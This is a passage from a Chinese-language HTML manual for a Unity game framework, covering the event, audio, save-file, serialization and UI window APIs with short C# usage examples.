EventSystem<span class="hljs-selector-class">.RemoveEvent</span>(eventName);
<span class="hljs-comment">//移除事件中心中所有事件</span>
EventSystem<span class="hljs-selector-class">.Clear</span>();
</code></pre>
<ul>
<li>eventName是解耦执行的方法的标记，即事件名，是触发事件时的唯一依据。</li>
</ul>
<h3 data-id="heading-45">类型事件</h3>
<p>支持对参数进行封装为一个struct传递，简化参数列表。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//添加类型事件的监听</span>
<span class="hljs-comment">//Action&lt;T&gt; action</span>
AddTypeEventListener&lt;T&gt;(action);
<span class="hljs-comment">//移除类型事件的监听</span>
RemoveTypeEventListener&lt;T&gt;(action);
<span class="hljs-comment">//移除/删除一个类型事件</span>
RemoveTypeEvent&lt;T&gt;();
<span class="hljs-comment">//触发类型事件</span>
<span class="hljs-comment">// (T arg)</span>
TypeEventTrigger&lt;T&gt;(arg);
</code></pre>
<ul>
<li>T是封装的参数列表，一般为struct类型。</li>
<li>action设计使用封装参数T的事件。</li>
<li>arg是封装的参数。</li>
</ul>
<h3 data-id="heading-46">注意</h3>
<p>事件系统的运行逻辑是，预先添加/移除事件监听，再在能够获取相应参数的类内触发事件。</p>
<h2 data-id="heading-47">音效系统</h2>
<p>音效服务集成了背景、特效音乐播放，音量、播放控制功能。包含了全局音量globalVolume、背景音量bgVolume、特效音量effectVolume、静音布尔量isMute、暂停布尔量isPause等音量相关的属性，播放背景音乐的PlayBGAudio方法且，播放特效音乐PlayOnShot方法且重载后支持在指定位置或绑定游戏对象播放特定的音乐，特效音乐由于要重复使用，可以从对象池中获取播放器并自动回收，支持播放后执行回调事件。</p>
<h3 data-id="heading-48">播放背景音乐</h3>
<h3 data-id="heading-49">音量、播放属性控制</h3>
<p>音效服务支持在Inspector面板上的值发生变化时自动执行相应的方法更新音量属性,也可以在属性值变化时自动调用相应的更新方法。</p>
<pre><code class="hljs language-ini" lang="ini">//API &amp; 示例
//全局音量(float,0~1),音量设定为50%
<span class="hljs-attr">AudioSystem.GlobalVolume</span> = <span class="hljs-number">0.5</span>f<span class="hljs-comment">;</span>
//背景音乐音量(float,0~1)，音量设定为50%
<span class="hljs-attr">AudioSystem.BGVolume</span> = <span class="hljs-number">0.5</span>f<span class="hljs-comment">;</span>
//特效音乐音量(flaot,0~1)
<span class="hljs-attr">AudioStystem.EffectVolume</span> = <span class="hljs-number">0.5</span>f<span class="hljs-comment">;</span>
//是否全局静音(bool),true则静音
<span class="hljs-attr">AudioSystem.IsMute</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
//背景音乐是否循环,true则循环
<span class="hljs-attr">AudioSystem.IsLoop</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
//背景音乐是否暂停，true则暂停
<span class="hljs-attr">AudioSystem.IsPause</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>GlobalVolume是全局音量，同时影响背景、特效音乐音量。</li>
<li>BGVolume是背景音乐音量</li>
<li>EffectVolume是特效音乐音量。</li>
<li>IsMute控制全局音量是否静音。</li>
<li>IsLoop控制背景音乐是否循环。</li>
<li>IsPause控制背景音乐是否暂停。</li>
</ul>
<p>支持通过面板更新音量属性。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a71a23e9bd8742c895db54508fe20d37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=gXpum3ViFvKvcAi%2Fs5g7SWZkY0M%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-50">播放背景音乐</h3>
<pre><code class="hljs language-ini" lang="ini">//API
//播放背景音乐
//(AudioClip clip, bool <span class="hljs-attr">loop</span> = <span class="hljs-literal">true</span>, float volume = -<span class="hljs-number">1</span>, float fadeOutTime = <span class="hljs-number">0</span>, float fadeInTime = <span class="hljs-number">0</span>)
AudioSystem.PlayBGAudio(clip, loop, volume, fadeOutTime, fadeInTime)<span class="hljs-comment">;</span>
//轮播多个背景音乐
//(AudioClip<span class="hljs-section">[]</span> clips, float <span class="hljs-attr">volume</span> = -<span class="hljs-number">1</span>, float fadeOutTime = <span class="hljs-number">0</span>, float fadeInTime = <span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
AudioSystem.PlayBGAudioWithClips(clips, volume, fadeOutTime, fadeInTime)<span class="hljs-comment">;</span>
//停止当前背景音乐
AudioSystem.StopBGAudio()<span class="hljs-comment">;</span>
//暂停当前背景音乐
AudioSystem.PauseBGAudio()<span class="hljs-comment">;</span>
//取消暂停当前音乐
AudioSystem.UnPauseBGAudio()<span class="hljs-comment">;</span>


//简单示例
AudioClip <span class="hljs-attr">clip</span> = ResSystem.LoadAsset&lt;AudioClip&gt;(<span class="hljs-string">"music"</span>)<span class="hljs-comment">;</span>
AudioSystem.PlayBGAudio(clip)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>clip是音乐片段，可以传clip数组来轮播音乐。</li>
<li>volume是音乐的音量，不指定则按原来的背景音量。</li>
<li>fadeOutTime是渐出音乐的时间。</li>
<li>fadeInTime是渐入音乐的时间。</li>
<li>停止当前背景音乐会将当前背景音乐置空。</li>
<li>暂停音乐可取消暂停恢复。</li>
</ul>
<h3 data-id="heading-51">播放特效音乐</h3>
<pre><code class="hljs language-ini" lang="ini">//API
//播放一次音效并绑定到游戏物体上，位置随物体变化
//(AudioClip clip, Component <span class="hljs-attr">component</span> = null, bool autoReleaseClip = <span class="hljs-literal">false</span>, float volumeScale = <span class="hljs-number">1</span>, bool is3d = <span class="hljs-literal">true</span>, Action callBack = null)
audioSystem.PlayOneShot(clip, component, autoReleaseClip, volumeScale, is3d, callBack)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, component, autoReleaseClip, volumeScale, is3d)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, component, autoReleaseClip, volumeScale)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, component, autoReleaseClip)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, component)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip)<span class="hljs-comment">;</span>
//在指定位置上播放一次音效
//(AudioClip clip, Vector3 position, bool <span class="hljs-attr">autoReleaseClip</span> = <span class="hljs-literal">false</span>, float volumeScale = <span class="hljs-number">1</span>, bool is3d = <span class="hljs-literal">true</span>, Action callBack = null)
audioSystem.PlayOneShot(clip, position, autoReleaseClip, volumeScale, is3d, callBack)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, position, autoReleaseClip, volumeScale, is3d)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, position, autoReleaseClip, volumeScale)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, position, autoReleaseClip)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, position)<span class="hljs-comment">;</span>
//简单示例
//在玩家位置播放一次音效
AudioClip <span class="hljs-attr">clip</span> = ResSystem.LoadAsset&lt;AudioClip&gt;(<span class="hljs-string">"music"</span>)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip,player.transform.position)<span class="hljs-comment">;</span>
//绑定玩家组件播放一次音效（等同于玩家位置）
audioSystem.PlayOneShot(clip,player.transform)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>clip是音乐片段，音效系统中特效音乐在每次播放时优先从对象池中取出挂载了AudioSource的GameObject实例生成并会在音效播放完成后自动回收。</li>
<li>postion是播放的位置，必填。</li>
<li>component是绑定的组件，这个API的目的是让音效随着物体移动一起移动，不填则默认不绑定。</li>
<li>autoReleaseClip代表是否需要在音乐播放结束后自动释放clip资源，Res和Addressable均可。</li>
<li>volumeScle是音乐的音量，不指定默认按最大音量。</li>
<li>is3D是启用空间音效，默认开启。</li>
<li>callBack是回调事件，会在音效播放完执行一个无参无返回值方法。</li>
</ul>
<p>使用Compoent绑定播放音效时，如果绑定物体如果在播放中被销毁了，那么AudioSource会提前解绑避免一同被销毁（通过事件工具提前添加监听），之后播放完毕会自动回收。</p>
<h2 data-id="heading-52">存档系统</h2>
<p>完成对存档的创建，获取，保存，加载，删除，缓存，支持多存档。存档有两类，一类是用户型存档，存储着某个游戏用户具体的信息，如血量，武器，游戏进度，一类是设置型存档，与任何用户存档都无关，是通用的存储信息，比如屏幕分辨率、音量设置等。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caa95c4bc8454184a223045a0b16c964~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=prHLWTjLI8J3E3PTTI3lnjYqdPA%3D" alt="alt" loading="lazy"/>​</p>
<p>存档系统支持两类本地文件：，两者通过框架设置面板进行切换，切换时，原本地文件存档会清空！二进制流文件可读性较差不易修改，Json可读性较强，易修改，存档的数据存在Application.persistentDataPath下。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa0107b375cd4eea85de63e6e2430a87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=c1TkfekCJSuK%2Bn8o7DSU2BqfW1Y%3D" alt="alt" loading="lazy"/>​</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58bd332ddec34c6c8511e0bc87defbe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=5Qtm8amFhOUN9DZYaIGsikBbyV8%3D" alt="alt" loading="lazy"/>​</p>
<p>SaveData和setting分别存储用户存档和设置型存档。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac3530badaf54138a327438b2b123a04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=M5QKah7CPB%2FEJwN6a3Q%2B1xZhELE%3D" alt="alt" loading="lazy"/>​</p>
<p>用户存档下根据saveID分成若干文件夹用于存储具体的对象。</p>
<h3 data-id="heading-53">设置型存档</h3>
<p>设置存档实际就是一个全局唯一的存档，可以向其中存储全局通用数据。</p>
<h4 data-id="heading-54">保存设置</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//保存设置到全局存档</span>
<span class="hljs-comment">//(object saveObject, string fileName)</span>
SaveSystem<span class="hljs-selector-class">.SaveSetting</span>(saveObject, fileName);
SaveSystem<span class="hljs-selector-class">.SaveSetting</span>(saveObject)
<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//见下一小节结合加载说明</span>
</code></pre>
<ul>
<li>saveObject是要保存的对象，System.Object类型。</li>
<li>fileName是保存的文件名称，不填默认取saveObject的类型名。</li>
</ul>
<h4 data-id="heading-55">加载设置</h4>
<pre><code class="hljs language-ini" lang="ini">///API
//从设置存档中加载设置
// string fileName
SaveSystem.LoadSetting&lt;T&gt;(fileName)<span class="hljs-comment">;</span>
SaveSystem.LoadSetting&lt;T&gt;()<span class="hljs-comment">;</span>


//简单示例
// GameSetting类中存储着游戏名称，作为全局数据
<span class="hljs-section">[Serializable]</span>
public class GameSetting
{
    public string gameName<span class="hljs-comment">;</span>
}
GameSetting <span class="hljs-attr">gameSetting</span> = new GameSetting()<span class="hljs-comment">;</span>
<span class="hljs-attr">gameSetting.gameName</span> = <span class="hljs-string">"测试"</span><span class="hljs-comment">;</span>
//保存设置
SaveSystem.SaveSetting(gameSetting)<span class="hljs-comment">;</span>
//取出来用
String <span class="hljs-attr">gameName</span> = SaveSystem.LoadSetting&lt;gameSetting&gt;().gameName<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-56">删除设置</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//删除用户存档和设置存档</span>
SaveSystem<span class="hljs-selector-class">.DeleteAll</span>();
</code></pre>
<ul>
<li>fileName是加载设置存档的文件名，T限定了所存储的数据类型，不填fileName则默认以T的类型名作为文件名加载。</li>
</ul>
<h3 data-id="heading-57">用户存档</h3>
<p>用户存档与具体的用户相关，不同用户存档位置不同，数据也不同，索引为SaveID。</p>
<h4 data-id="heading-58">创建用户存档</h4>
<p>创建的存档索引默认自增。</p>
<pre><code class="hljs language-ini" lang="ini">//API
SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>


//简单示例
SaveItem <span class="hljs-attr">saveItem</span> = SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-59">获取用户存档</h4>
<h5 data-id="heading-60">存档层面</h5>
<h6 data-id="heading-61">获取所有用户存档</h6>
<p>根据一定规则获取所有用户存档，返回List。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//最新的在最后面</span>
SaveSystem<span class="hljs-selector-class">.GetAllSaveItem</span>();
<span class="hljs-comment">//最近创建的在最前面</span>
SaveSystem<span class="hljs-selector-class">.GetAllSaveItemByCreatTime</span>();
<span class="hljs-comment">//最近更新的在最前面</span>
SaveSystem<span class="hljs-selector-class">.GetAllSaveItemByUpdateTime</span>();
<span class="hljs-comment">//万能解决方案，自定义规则</span>
GetAllSaveItem&lt;T&gt;(Func&lt;SaveItem, T&gt; orderFunc, bool isDescending = false)


<span class="hljs-comment">//简单示例,万能方案，按照SaveID倒序获得存档</span>
GameSetting gameSetting = new <span class="hljs-built_in">GameSetting</span>();
List&lt;SaveItem&gt; testList = SaveSystem<span class="hljs-selector-class">.GetAllSaveItem</span>&lt;int&gt;(oderFunc, true);
<span class="hljs-comment">//List&lt;SaveItem&gt; testList = SaveSystem.GetAllSaveItem();</span>
foreach (var item in testList)
{
    Debug<span class="hljs-selector-class">.Log</span>(item.saveID);
}
<span class="hljs-comment">//排序依据Func</span>
int <span class="hljs-built_in">oderFunc</span>(SaveItem item)
{
    return item<span class="hljs-selector-class">.saveID</span>;
}
</code></pre>
<ul>
<li>提供多种重载方法获取存档List。</li>
<li>支持自定义排序依据的万解决方案，T传比较参数类型，orderFunc传比较方法。</li>
</ul>
<h6 data-id="heading-62">获取某一项用户存档</h6>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(int id, SaveItem saveItem)</span>
SaveSystem<span class="hljs-selector-class">.GetSaveItem</span>(id);
SaveSystem<span class="hljs-selector-class">.GetSaveItem</span>(saveItem);


<span class="hljs-comment">//简单示例</span>
SaveItem saveItem = SaveSystem<span class="hljs-selector-class">.CreateSaveItem</span>();
SaveSystem<span class="hljs-selector-class">.GetSaveItem</span>(saveItem);
</code></pre>
<ul>
<li>id是用户存档的编号，存档系统会在创建时指定默认ID，使用时透明，因此推荐使用saveItem传参，saveItem是可维护的。</li>
</ul>
<h5 data-id="heading-63">删除用户存档</h5>
<h6 data-id="heading-64">删除所有用户存档</h6>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//删除所有用户存档</span>
SaveSystem<span class="hljs-selector-class">.DeleteAllSaveItem</span>();
</code></pre>
<h6 data-id="heading-65">删除某一项用户存档</h6>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(int id, SaveItem saveItem)</span>
SaveSystem<span class="hljs-selector-class">.DeleteSaveItem</span>(id);
SaveSystem<span class="hljs-selector-class">.DeleteSaveItem</span>(saveItem);


<span class="hljs-comment">//简单示例</span>
SaveItem saveItem = SaveSystem<span class="hljs-selector-class">.CreateSaveItem</span>();
SaveSystem<span class="hljs-selector-class">.DeleteSaveItem</span>(saveItem);
</code></pre>
<ul>
<li>id是用户存档的编号，存档系统会在创建时指定默认ID，使用时透明，因此推荐使用saveItem传参，saveItem是可维护的。</li>
</ul>
<h4 data-id="heading-66">存档对象层面</h4>
<h5 data-id="heading-67">保存用户存档中某一对象</h5>
<pre><code class="hljs language-ini" lang="ini">//API
//(object saveObject, string saveFileName, SaveItem saveItemint, <span class="hljs-attr">saveID</span> = <span class="hljs-number">0</span>)
SaveSystem.SaveObject(saveObject, saveFileName, saveID)<span class="hljs-comment">;</span>
SaveSystem.SaveObject(saveObject, saveFileName, saveItem)<span class="hljs-comment">;</span>
SaveSystem.SaveObject(saveObject, saveID)<span class="hljs-comment">;</span>
SaveSystem.SaveObject(saveObject, saveItem)<span class="hljs-comment">;</span>


//简单示例
SaveItem <span class="hljs-attr">saveItem</span> = SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = new GameSetting()<span class="hljs-comment">;</span>
SaveSystem.SaveObject(gameSetting, saveItem)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>saveObject是要保存的对象。</li>
<li>saveFileName是保存后生成的本地文件名（对象会单独作为一个文件存储在对应saveID的文件夹下），不填则以对象的类型名为文件名。</li>
<li>saveID/SaveItem是对象存储的存档。</li>
<li>保存对象时会更新用户存档缓存。</li>
</ul>
<h5 data-id="heading-68">获取用户存档中某一对象</h5>
<pre><code class="hljs language-ini" lang="ini">//API
//(string saveFileName, SaveItem saveItem, int <span class="hljs-attr">saveID</span> = <span class="hljs-number">0</span>)
SaveSystem.LoadObject&lt;T&gt;(saveFileName, saveID)<span class="hljs-comment">;</span>
SaveSystem.LoadObject&lt;T&gt;(saveFileName, saveItem)<span class="hljs-comment">;</span>
SaveSystem.LoadObject&lt;T&gt;(saveID)<span class="hljs-comment">;</span>
SaveSystem.LoadObject&lt;T&gt;(saveItem)<span class="hljs-comment">;</span>


//简单示例
SaveItem <span class="hljs-attr">saveItem</span> = SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = new GameSetting()<span class="hljs-comment">;</span>
SaveSystem.SaveObject(gameSetting, saveItem)<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = SaveSystem.LoadObject&lt;GameSetting&gt;(saveItem)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>T指定获取对象类型。</li>
<li>saveFileName是获取对象的文件名，不填则默认以T的类型名作为文件名。</li>
<li>saveID/SaveItem是对象存储的存档。</li>
<li>获取对象优先从缓存中读取，不存在则IO读文件获取，并加入缓存。</li>
</ul>
<h5 data-id="heading-69">删除用户存档中某一对象</h5>
<pre><code class="hljs language-ini" lang="ini">//API
//(string saveFileName, SaveItem saveItem, int <span class="hljs-attr">saveID</span> = <span class="hljs-number">0</span>)
SaveSystem.DeleteObject&lt;T&gt;(saveFileName, saveID)<span class="hljs-comment">;</span>
SaveSystem.DeleteObject&lt;T&gt;(saveFileName, saveItem)<span class="hljs-comment">;</span>
SaveSystem.DeleteObject&lt;T&gt;(saveID)<span class="hljs-comment">;</span>
SaveSystem.DeleteObject&lt;T&gt;(saveItem)<span class="hljs-comment">;</span>


//简单示例
SaveItem <span class="hljs-attr">saveItem</span> = SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = new GameSetting()<span class="hljs-comment">;</span>
SaveSystem.DeleteObject(gameSetting, saveItem)<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = SaveSystem.DeleteObject&lt;GameSetting&gt;(saveItem)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>T指定获取对象类型。</li>
<li>saveFileName是获取对象的文件名，不填则默认以T的类型名作为文件名。</li>
<li>saveID/SaveItem是对象存储的存档。</li>
<li>删除某一对象时，如果存在对应的缓存，则一并删除。</li>
</ul>
<h5 data-id="heading-70">注意</h5>
<p>在从用户存档中取出对象时，底层优先从缓存中读取，避免读时IO，使用时无需关注。</p>
<h3 data-id="heading-71">序列化字典，vector，color</h3>
<p>框架提供了字典的二进制序列化方法以进行存档，给字典包了一层壳，在序列化和反序列化时自动拆分成List存储、组合成Dictionary使用。同时将Color，vector2，vector3单独封装成结构体进行存储，舍弃掉Unity数据类型中自带的额外方法和属性，只保留rgba和xyz坐标。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">//API</span>
Vector3 <span class="hljs-punctuation">-&gt;</span> Serialized_Vector3
Vector2 <span class="hljs-punctuation">-&gt;</span> Serialized_Vector2
Color <span class="hljs-punctuation">-&gt;</span> Serialized_Color
Dictionary<span class="hljs-punctuation">-&gt;</span>Serialized_Dic
</code></pre>
<p>在使用时，将原先定义字典等数据的语句关键字进行替换即可，框架重载了赋值运算符，构造函数以及类型转换方法，使得序列化的数据类型可以自动跟原生的Vector2，Vector3，Vector2Int，Vector3Int，Color互转，在使用体验上与原生的关键词无异。</p>
<h2 data-id="heading-72">UI框架</h2>
<p>UI框架实现对窗口的生命周期管理，层级遮罩管理，按键物理响应等功能，对外提供窗口的打开、关闭、窗口复用API，对内优化好窗口的缓存、层级问题，能够和场景加载、事件系统联动，将Model、View、Controller完全解耦。通过与配置系统、脚本可视化合作，实现新UI窗口对象的快速开发和已有UI窗口的方便接入。</p>
<h3 data-id="heading-73">数据结构</h3>
<p>虽然本文档使用手册，但为了便于上手理解，简单对UI框架的数据结构进行解释。</p>
<pre><code class="hljs language-csharp" lang="csharp">    <span class="hljs-comment">//UI窗口数据字典</span>
    Dictionary&lt;<span class="hljs-built_in">string</span>, UIWindowData&gt; UIWindowDataDic;


    <span class="hljs-comment">//UI窗口数据类</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">UIWindowData</span>
    {
        [<span class="hljs-meta">LabelText(<span class="hljs-string">"是否需要缓存"</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> isCache;
        [<span class="hljs-meta">LabelText(<span class="hljs-string">"预制体Path或AssetKey"</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> assetPath;
        [<span class="hljs-meta">LabelText(<span class="hljs-string">"UI层级"</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> layerNum;
        <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
        <span class="hljs-comment"><span class="hljs-doctag">///</span> 这个元素的窗口对象</span>
        <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
        [<span class="hljs-meta">LabelText(<span class="hljs-string">"窗口实例"</span>)</span>] <span class="hljs-keyword">public</span> UI_WindowBase instance;


        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">UIWindowData</span>(<span class="hljs-params"><span class="hljs-built_in">bool</span> isCache, <span class="hljs-built_in">string</span> assetPath, <span class="hljs-built_in">int</span> layerNum</span>)</span>
        {
            <span class="hljs-keyword">this</span>.isCache = isCache;
            <span class="hljs-keyword">this</span>.assetPath = assetPath;
            <span class="hljs-keyword">this</span>.layerNum = layerNum;
            instance = <span class="hljs-literal">null</span>;
        }
    }
</code></pre>
<p>UI框架的核心在于维护字典UIWindowDataDic，通过windowKey索引了不同的UI窗口数据UiWindowData，其中包含了窗口是否要缓存，资源路径，UI层级，以及窗口类实例（脚本作为窗口对象的组件，持有他就相当于持有了窗口gameObject），UIWindowData可以通过运行时动态加载也可以在Editor时通过特性静态加载，设计windowKey的原因是如果不额外标定windowKey直接用资源路径作为索引，则同一个窗口资源无法复用，换句话说，同一个UI窗口游戏对象及窗口类，通过不同的windowKey和实例可以进行重用。</p>
<h3 data-id="heading-74">UI窗口对象及类配置</h3>
<p>使用UI框架需要先为UI窗口游戏对象添加控制类，该类继承自UI_WindowBase,并将UI窗口游戏对象加入Addressable列表/Resources文件夹下。</p>
<h3 data-id="heading-75">UI窗口特性-Editor静态加载</h3>
<p>可以选择为UI窗口类打上UIWindowData特性（Attribute可省略）用于配置数据。<br/>
​<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c86b28037904f318f29cc1edcf6c9a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=bOCfAd7i3%2FPTvBshU9yShSN9s6o%3D" alt="alt" loading="lazy"/>​</p>
<pre><code class="hljs language-go" lang="go">UIWindowDataAttribute(<span class="hljs-type">string</span> windowKey, <span class="hljs-type">bool</span> isCache, <span class="hljs-type">string</span> assetPath, <span class="hljs-type">int</span> layerNum){}
UIWindowDataAttribute(Type <span class="hljs-keyword">type</span>,<span class="hljs-type">bool</span> isCache, <span class="hljs-type">string</span> assetPath, <span class="hljs-type">int</span> layerNum){}
</code></pre>
<ul>
<li>特性中windowKey是UI窗口的名字唯一索引，可以直接传string也可以传Type使用其FullName。</li>
<li>isCache指明UI窗口游戏对象是否需要缓存重用，true则在窗口关闭时不会被销毁，下次使用时可以通过windowKey调用且不需要实例化。</li>
<li>assetPath是资源的路径，在Resources中是UI窗口对象在Resources文件夹下的路径，Addressable中是UI窗口对象的Addressable Name。</li>
<li>layerNum是UI窗口对象的层级，从0开始，越大则越接近顶层。</li>
<li>支持一个窗口类多特性，复用同一份窗口类资源，n个特性，则有n份UI窗口数据，本质上对应了多个windowKey，因此windowKey必须不同。</li>
</ul>
<p>经过配置后，在Editor模式下该UI类特性数据及UI窗口游戏对象（此时还没有实例化为空）会自动保存到GameRoot的配置文件中，即静态加载。</p>
<h3 data-id="heading-76">UI窗口运行时动态加载</h3>
<p>在运行时动态加载UI窗口，不需要给窗口类打特性，窗口数据直接给出，与Onshow/OnClose不同，其不包含窗口游戏物体对象的显示/隐藏/销毁逻辑。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(string windowKey, UIWindowData windowData, bool instantiateAtOnce = false)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(windowKey, windowData, instantiateAtOnce);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(windowKey, windowData, instantiateAtOnce);
<span class="hljs-comment">//(Type type, UIWindowData windowData, bool instantiateAtOnce = false)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(type, windowData, instantiateAtOnce);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(type, windowData);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>&lt;<span class="hljs-type">T</span>&gt;(windowData, instantiateAtOnce);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>&lt;<span class="hljs-type">T</span>&gt;(windowData);


<span class="hljs-comment">//简单实例</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(<span class="hljs-string">"Test1"</span>, new <span class="hljs-type">UIWindowData</span>(<span class="hljs-literal">true</span>, <span class="hljs-string">"TestWindow"</span>, <span class="hljs-number">1</span>));
<span class="hljs-comment">//上一步只添加了数据，显示在面板上还需要激活</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">TestWindow</span>&gt;(<span class="hljs-string">"Test1"</span>);
</code></pre>
<ul>
<li>通过泛型T指定UI窗口子类类型，windowKey为UI窗口类的索引，对应UIWindowData中的windowKey，不指定则使用T的类型名作为索引。</li>
<li>instantiateAtOnce指明窗口对象及其类是否要进行实例化，默认为null，会在窗口打开时加载资源进行实例化且设置为不激活，若窗口资源较大，可以提前在动态加载时就进行实例化，如图。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06a22898ef064ab0a2598e4775be4864~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=5uAP%2FtuM1G5QJ6GmnZ7GqFjFp0U%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-77">UI窗口数据管理</h3>
<p>获取UI窗口数据，其中包含UI的windowKey，层级，资源路径，以及对象实例，可以对其进行操作。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//获取UI窗口数据</span>
<span class="hljs-comment">//(string windowKey) (Type windowType)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetUIWindowData</span>(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetUIWindowData</span>&lt;<span class="hljs-type">T</span>&gt;();
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetUIWindowData</span>(windowType);
<span class="hljs-comment">//尝试获取UI窗口数据，返回bool</span>
<span class="hljs-comment">//(string windowKey, out UIWindowData windowData</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">TryGetUIWindowData</span>(windowKey, windowData);
<span class="hljs-comment">//移除某条UI窗口数据</span>
<span class="hljs-comment">//(string windowKey, bool destoryWidnow = false)</span>
